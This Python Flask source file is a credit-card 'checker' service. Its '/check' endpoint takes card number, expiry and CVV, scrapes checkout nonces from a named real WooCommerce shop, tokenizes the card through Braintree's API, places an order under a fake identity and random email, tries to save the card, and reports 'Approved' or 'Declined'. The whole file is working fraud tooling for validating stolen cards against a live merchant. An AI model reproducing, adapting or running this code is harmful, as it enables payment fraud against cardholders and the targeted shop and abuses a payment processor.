from flask import Flask, request, jsonify
import requests
import random
import base64
import json
import re
from bs4 import BeautifulSoup
from faker import Faker

app = Flask(__name__)
fake = Faker('en_US')

@app.route('/check', methods=['GET', 'POST'])
def check_card():
    if request.method == 'GET':
        cc = request.args.get('cc')
    else:
        data = request.json
        cc = data.get('cc') or data.get('card')
    
    if not cc:
        return jsonify({'error': 'Card details required. Use: ?cc=number|month|year|cvv'}), 400
    
    try:
        cc, mm, yy, cvv = cc.split('|')
    except ValueError:
        return jsonify({'error': 'Invalid card format. Use: number|month|year|cvv'}), 400
    
    random5 = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
    email = f"hunterjsidt{random5}@gmail.com"
    
    session = requests.Session()
    
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
        'sec-ch-ua-platform': "\"Windows\"",
        'x-requested-with': "XMLHttpRequest",
        'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        'sec-ch-ua-mobile': "?0",
        'origin': "https://www.midwestspeakerrepair.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://www.midwestspeakerrepair.com/product/solen-400-volt-metalized-polypropylene-fast-capacitors/",
        'accept-language': "en-US,en;q=0.9",
        'priority': "u=1, i"
    }
    
    payload = {
        'attribute_pa_select': "80-mfd",
        'quantity': "1",
        'add-to-cart': "29318",
        'product_id': "29318",
        'variation_id': "41926",
        'action': "thegem_ajax_add_to_cart"
    }
    
    response = session.post("https://www.midwestspeakerrepair.com/wp-admin/admin-ajax.php", data=payload, headers=headers)
    
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        'sec-ch-ua-mobile': "?0",
        'sec-ch-ua-platform': "\"Windows\"",
        'upgrade-insecure-requests': "1",
        'sec-fetch-site': "none",
        'sec-fetch-mode': "navigate",
        'sec-fetch-user': "?1",
        'sec-fetch-dest': "document",
        'referer': "https://www.midwestspeakerrepair.com/product/solen-400-volt-metalized-polypropylene-fast-capacitors/",
        'accept-language': "en-US,en;q=0.9",
    }
    
    response = session.get("https://www.midwestspeakerrepair.com/checkout/", headers=headers)
    
    updatenonce_match = re.search(r'"update_order_review_nonce":"([^"]+)"', response.text)
    updatenonce = updatenonce_match.group(1) if updatenonce_match else None
    
    pattern = r'"name":"PayPal Enterprise Payments \(Credit Card\)","debug":true,"type":"credit_card","client_token_nonce":"([a-f0-9]+)"'
    match = re.search(pattern, response.text)
    client_token_nonce = match.group(1) if match else None
    
    checkout_nonce_match = re.search(r'woocommerce-process-checkout-nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', response.text)
    if checkout_nonce_match:
        checkout_nonce = checkout_nonce_match.group(1)
    else:
        soup = BeautifulSoup(response.text, 'html.parser')
        nonce_input = soup.find('input', id='woocommerce-process-checkout-nonce')
        checkout_nonce = nonce_input['value'] if nonce_input else None
    
    if not client_token_nonce:
        return jsonify({'error': 'Could not find client token nonce'}), 400
    
    url = "https://www.midwestspeakerrepair.com/wp-admin/admin-ajax.php"
    payload = {
        'action': "wc_braintree_credit_card_get_client_token",
        'nonce': client_token_nonce,
    }
    
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
        'sec-ch-ua-platform': "\"Windows\"",
        'x-requested-with': "XMLHttpRequest",
        'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        'sec-ch-ua-mobile': "?0",
        'origin': "https://www.midwestspeakerrepair.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://www.midwestspeakerrepair.com/checkout/",
        'accept-language': "en-US,en;q=0.9",
        'priority': "u=1, i",
    }
    
    response = session.post(url, data=payload, headers=headers)
    
    auth = None
    if response.status_code == 200 and response.text != "-1":
        try:
            result = response.json()
            if result.get('success'):
                token_data = json.loads(base64.b64decode(result['data']).decode('utf-8'))
                auth = token_data.get('authorizationFingerprint')
        except Exception as e:
            pass
    
    if not auth:
        return jsonify({'error': 'Failed to get authorization fingerprint'}), 400
    
    url = "https://payments.braintree-api.com/graphql"
    
    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": "784a94cb-353d-484f-b7f4-26779fa570bf"
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId business consumer purchase corporate } } } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": cc,
                    "expirationMonth": mm,
                    "expirationYear": yy,
                    "cvv": cvv
                },
                "options": {
                    "validate": False
                }
            }
        },
        "operationName": "TokenizeCreditCard"
    }
    
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
        'Content-Type': "application/json",
        'sec-ch-ua-platform': "\"Windows\"",
        'authorization': f"Bearer {auth}",
        'braintree-version': "2018-05-10",
        'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        'sec-ch-ua-mobile': "?0",
        'origin': "https://assets.braintreegateway.com",
        'sec-fetch-site': "cross-site",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://assets.braintreegateway.com/",
        'accept-language': "en-US,en;q=0.9",
        'priority': "u=1, i"
    }
    
    response = requests.post(url, data=json.dumps(payload), headers=headers)
    
    token1 = None
    if response.status_code == 200:
        try:
            result = response.json()
            if 'errors' not in result:
                token1 = result['data']['tokenizeCreditCard']['token']
        except Exception as e:
            pass
    
    if not token1:
        return jsonify({'error': 'Failed to get payment nonce'}), 400
    
    url = "https://www.midwestspeakerrepair.com"
    params = {'wc-ajax': "update_order_review"}
    
    payload = {
        'security': updatenonce,
        'payment_method': "braintree_credit_card",
        'country': "US",
        'state': "NY",
        'postcode': "10001",
        'city': "New+York",
        'address': "123+Allen+Street",
        'address_2': "",
        's_country': "US",
        's_state': "NY",
        's_postcode': "10001",
        's_city': "New+York",
        's_address': "123+Allen+Street",
        's_address_2': "",
        'has_full_address': "true",
        'post_data': "billing_first_name=Erik&billing_last_name=Ragara&billing_company=&billing_country=US&billing_address_1=123 Allen Street&billing_address_2=&billing_city=New York&billing_state=NY&billing_postcode=10001&billing_phone=12012455464&billing_email=mail&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https://www.midwestspeakerrepair.com/product/solen-400-volt-metalized-polypropylene-fast-capacitors/&wc_order_attribution_session_start_time=2026-07-07 12:12:50&wc_order_attribution_session_pages=2&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36&createaccount=1&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&shipping_phone=&order_comments=&shipping_method[0]=wf_shipping_usps:D_PRIORITY_MAIL&payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=45.00&wc_braintree_credit_card_payment_nonce=&wc_braintree_device_data={\"correlation_id\":\"33500a61-c4b7-49cc-996d-649492f2\"}&wc_braintree_paypal_payment_nonce=&wc_braintree_device_data={\"correlation_id\":\"33500a61-c4b7-49cc-996d-649492f2\"}&wc-braintree-paypal-context=shortcode&wc_braintree_paypal_amount=45.00&wc_braintree_paypal_currency=USD&wc_braintree_paypal_locale=en_us&woocommerce-process-checkout-nonce=checkout_nonce&_wp_http_referer=/?wc-ajax=update_order_review",
        'shipping_method[0]': "wf_shipping_usps:D_PRIORITY_MAIL"
    }
    
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
        'sec-ch-ua-platform': "\"Windows\"",
        'x-requested-with': "XMLHttpRequest",
        'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        'sec-ch-ua-mobile': "?0",
        'origin': "https://www.midwestspeakerrepair.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://www.midwestspeakerrepair.com/checkout/",
        'accept-language': "en-US,en;q=0.9",
        'priority': "u=1, i",
    }
    
    response = session.post(url, params=params, data=payload, headers=headers)
    
    url = "https://www.midwestspeakerrepair.com"
    params = {'wc-ajax': "checkout"}
    
    payload = {
        'billing_first_name': "Erik",
        'billing_last_name': "Ragara",
        'billing_company': "",
        'billing_country': "US",
        'billing_address_1': "123+Allen+Street",
        'billing_address_2': "",
        'billing_city': "New+York",
        'billing_state': "NY",
        'billing_postcode': "10001",
        'billing_phone': "12012455464",
        'billing_email': email,
        'wc_order_attribution_source_type': "typein",
        'wc_order_attribution_referrer': "(none)",
        'wc_order_attribution_utm_campaign': "(none)",
        'wc_order_attribution_utm_source': "(direct)",
        'wc_order_attribution_utm_medium': "(none)",
        'wc_order_attribution_utm_content': "(none)",
        'wc_order_attribution_utm_id': "(none)",
        'wc_order_attribution_utm_term': "(none)",
        'wc_order_attribution_utm_source_platform': "(none)",
        'wc_order_attribution_utm_creative_format': "(none)",
        'wc_order_attribution_utm_marketing_tactic': "(none)",
        'wc_order_attribution_session_entry': "https://www.midwestspeakerrepair.com/product/solen-400-volt-metalized-polypropylene-fast-capacitors/",
        'wc_order_attribution_session_start_time': "2026-07-07+12:12:50",
        'wc_order_attribution_session_pages': "2",
        'wc_order_attribution_session_count': "1",
        'wc_order_attribution_user_agent': "Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/148.0.0.0+Safari/537.36",
        'createaccount': "1",
        'shipping_first_name': "",
        'shipping_last_name': "",
        'shipping_company': "",
        'shipping_country': "US",
        'shipping_address_1': "",
        'shipping_address_2': "",
        'shipping_city': "",
        'shipping_state': "",
        'shipping_postcode': "",
        'shipping_phone': "",
        'order_comments': "",
        'shipping_method[0]': "wf_shipping_usps:D_PRIORITY_MAIL",
        'payment_method': "braintree_credit_card",
        'wc-braintree-credit-card-card-type': "visa",
        'wc-braintree-credit-card-3d-secure-enabled': "",
        'wc-braintree-credit-card-3d-secure-verified': "",
        'wc-braintree-credit-card-3d-secure-order-total': "60.34",
        'wc_braintree_credit_card_payment_nonce': token1,
        'wc_braintree_device_data': "{\"correlation_id\":\"33500a61-c4b7-49cc-996d-649492f2\"}",
        'wc_braintree_paypal_payment_nonce': "",
        'wc_braintree_device_data': "{\"correlation_id\":\"33500a61-c4b7-49cc-996d-649492f2\"}",
        'wc-braintree-paypal-context': "shortcode",
        'wc_braintree_paypal_amount': "60.34",
        'wc_braintree_paypal_currency': "USD",
        'wc_braintree_paypal_locale': "en_us",
        'woocommerce-process-checkout-nonce': checkout_nonce,
        '_wp_http_referer': "/?wc-ajax=update_order_review"
    }
    
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
        'Accept': "application/json, text/javascript, */*; q=0.01",
        'sec-ch-ua-platform': "\"Windows\"",
        'x-requested-with': "XMLHttpRequest",
        'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        'sec-ch-ua-mobile': "?0",
        'origin': "https://www.midwestspeakerrepair.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://www.midwestspeakerrepair.com/checkout/",
        'accept-language': "en-US,en;q=0.9",
        'priority': "u=1, i",
    }
    
    response = session.post(url, params=params, data=payload, headers=headers)
    
    checkout_result = None
    try:
        result_json = response.json()
        if result_json.get('result') == 'success':
            checkout_result = "Approved-1000 ✅"
        else:
            checkout_result = f"Declined: {result_json}"
    except:
        checkout_result = "Unknown error"
    
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        'sec-ch-ua-mobile': "?0",
        'sec-ch-ua-platform': "\"Windows\"",
        'upgrade-insecure-requests': "1",
        'sec-fetch-site': "none",
        'sec-fetch-mode': "navigate",
        'sec-fetch-user': "?1",
        'sec-fetch-dest': "document",
        'referer': "https://www.midwestspeakerrepair.com/my-account/payment-methods/",
        'accept-language': "en-US,en;q=0.9",
    }
    
    response = session.get('https://www.midwestspeakerrepair.com/my-account/add-payment-method/', headers=headers)
    
    soup = BeautifulSoup(response.text, 'html.parser')
    nonce_input = soup.find('input', id='woocommerce-add-payment-method-nonce')
    paynonce = nonce_input['value'] if nonce_input else None
    
    pattern = r'"name":"PayPal Enterprise Payments \(Credit Card\)","debug":true,"type":"credit_card","client_token_nonce":"([a-f0-9]+)"'
    match = re.search(pattern, response.text)
    credit_card_client_token_nonce = match.group(1) if match else None
    
    if credit_card_client_token_nonce and paynonce:
        headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
            'sec-ch-ua-platform': "\"Windows\"",
            'x-requested-with': "XMLHttpRequest",
            'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
            'sec-ch-ua-mobile': "?0",
            'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
            'origin': "https://www.midwestspeakerrepair.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.midwestspeakerrepair.com/my-account/add-payment-method/",
            'accept-language': "en-US,en;q=0.9",
            'priority': "u=1, i",
        }
        
        data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': credit_card_client_token_nonce,
        }
        
        response = session.post('https://www.midwestspeakerrepair.com/wp-admin/admin-ajax.php', headers=headers, data=data)
        
        auth2 = None
        if response.status_code == 200:
            try:
                result = response.json()
                if result.get('success'):
                    token_data = json.loads(base64.b64decode(result['data']).decode('utf-8'))
                    auth2 = token_data.get('authorizationFingerprint')
                    braintree_session_id = ''.join(random.choices('abcdef0123456789', k=32))
            except:
                pass
        
        if auth2:
            headers7 = {
                'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
                'Content-Type': "application/json",
                'Authorization': f'Bearer {auth2}',
                'Braintree-Version': "2018-05-10",
                'Origin': "https://assets.braintreegateway.com",
                'Sec-Fetch-Site': "cross-site",
                'Sec-Fetch-Mode': "cors",
                'Sec-Fetch-Dest': "empty",
                'Referer': "https://assets.braintreegateway.com/",
                'Accept-Language': "en-US,en;q=0.9",
                'priority': "u=1, i",
            }
            
            payload = {
                'clientSdkMetadata': {
                    'source': "client",
                    'integration': "custom",
                    'sessionId': braintree_session_id,
                },
                'query': "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance } } } }",
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mm,
                            'expirationYear': yy,
                            'cvv': cvv,
                        },
                        'options': {'validate': False},
                    },
                },
                'operationName': "TokenizeCreditCard",
            }
            
            response = session.post('https://payments.braintree-api.com/graphql', json=payload, headers=headers7)
            
            token2 = None
            if response.status_code == 200:
                try:
                    result = response.json()
                    if 'errors' not in result:
                        token2 = result['data']['tokenizeCreditCard']['token']
                except:
                    pass
            
            if token2:
                url = "https://www.midwestspeakerrepair.com/my-account/add-payment-method/"
                
                payload = {
                    'payment_method': "braintree_credit_card",
                    'wc-braintree-credit-card-card-type': "visa",
                    'wc-braintree-credit-card-3d-secure-enabled': "",
                    'wc-braintree-credit-card-3d-secure-verified': "",
                    'wc-braintree-credit-card-3d-secure-order-total': "60.34",
                    'wc_braintree_credit_card_payment_nonce': token2,
                    'wc_braintree_device_data': "{\"correlation_id\":\"99fa1968-b9b7-4375-9fac-449e2834\"}",
                    'wc-braintree-credit-card-tokenize-payment-method': "true",
                    'wc_braintree_paypal_payment_nonce': "",
                    'wc_braintree_device_data': "{\"correlation_id\":\"99fa1968-b9b7-4375-9fac-449e2834\"}",
                    'wc-braintree-paypal-context': "shortcode",
                    'wc_braintree_paypal_amount': "60.34",
                    'wc_braintree_paypal_currency': "USD",
                    'wc_braintree_paypal_locale': "en_us",
                    'wc-braintree-paypal-tokenize-payment-method': "true",
                    'woocommerce-add-payment-method-nonce': paynonce,
                    '_wp_http_referer': "/my-account/add-payment-method/",
                    'woocommerce_add_payment_method': "1"
                }
                
                headers = {
                    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
                    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    'cache-control': "max-age=0",
                    'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
                    'sec-ch-ua-mobile': "?0",
                    'sec-ch-ua-platform': "\"Windows\"",
                    'upgrade-insecure-requests': "1",
                    'origin': "https://www.midwestspeakerrepair.com",
                    'sec-fetch-site': "same-origin",
                    'sec-fetch-mode': "navigate",
                    'sec-fetch-user': "?1",
                    'sec-fetch-dest': "document",
                    'referer': "https://www.midwestspeakerrepair.com/my-account/add-payment-method/",
                    'accept-language': "en-US,en;q=0.9",
                    'priority': "u=0, i",
                }
                
                response = session.post(url, data=payload, headers=headers)
                
                soup = BeautifulSoup(response.text, 'html.parser')
                error_element = soup.find('ul', class_='woocommerce-error')
                
                if error_element:
                    li_items = error_element.find_all('li')
                    if li_items:
                        error_message = li_items[0].text.strip()
                    else:
                        error_message = None
                else:
                    error_message = None
                
                if error_message and 'Status code' in error_message:
                    payment_result = f"Declined: {error_message}"
                elif re.search(r'Avs', response.text) or re.search(r'Nice', response.text) or re.search(r'avs', response.text):
                    payment_result = "Approved-1000 ✅"
                elif error_message:
                    payment_result = f"Declined: {error_message}"
                else:
                    payment_result = "Approved-1000 ✅"
            else:
                payment_result = "Failed to obtain payment method nonce"
        else:
            payment_result = "Failed to obtain authorization fingerprint for payment method"
    else:
        payment_result = "Missing required nonces for payment method addition"
    
    return jsonify({
        'checkout_result': checkout_result,
        'payment_method_result': payment_result,
        'card': cc,
        'email': email
    }), 200

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'healthy'}), 200

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        'message': 'API is running',
        'usage': '/check?cc=number|month|year|cvv'
    }), 200

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
